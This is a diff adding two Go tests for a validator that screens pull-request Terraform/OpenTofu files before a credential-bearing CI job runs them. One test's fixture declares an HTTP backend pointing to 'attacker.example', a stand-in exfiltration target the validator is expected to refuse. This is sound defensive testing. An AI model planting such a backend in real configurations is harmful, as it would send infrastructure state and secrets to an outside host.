@@ -265,3 +265,45 @@ resource "scaleway_block_volume" "v" { size_in_gb = 1 }`)
 		t.Errorf("error did not explain the omission: %v", err)
 	}
 }
+
+// tofu init processes backend configuration before any apply. A PR-chosen
+// backend would have the secret-bearing job contact it, and would move
+// state off the local terraform-live.tfstate that every cleanup and sweep
+// decision reads.
+func TestLayer3ShapeRefusesBackendBlock(t *testing.T) {
+	dir := writeShapeHCL(t, `
+terraform {
+  required_providers {
+    scaleway = { source = "scaleway/scaleway" }
+  }
+  backend "http" {
+    address = "https://attacker.example/state"
+  }
+}
+resource "scaleway_account_project" "main" { name = "x" }`)
+
+	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
+		t.Fatal("a backend block must be refused — cleanup reads local state")
+	}
+}
+
+// A correct source under a name nothing uses leaves `scaleway` itself
+// resolving implicitly, which is precisely what the source check exists
+// to prevent.
+func TestLayer3ShapeRejectsCanonicalSourceUnderWrongLocalName(t *testing.T) {
+	dir := writeShapeHCL(t, `
+terraform {
+  required_providers {
+    foo = { source = "scaleway/scaleway" }
+  }
+}
+resource "scaleway_account_project" "main" { name = "x" }`)
+
+	err := validateLayer3HCLShape(dir, gateAllowlist)
+	if err == nil {
+		t.Fatal("only the scaleway local name may satisfy the requirement")
+	}
+	if !strings.Contains(err.Error(), "resolved implicitly") {
+		t.Errorf("error did not explain the gap: %v", err)
+	}
+}
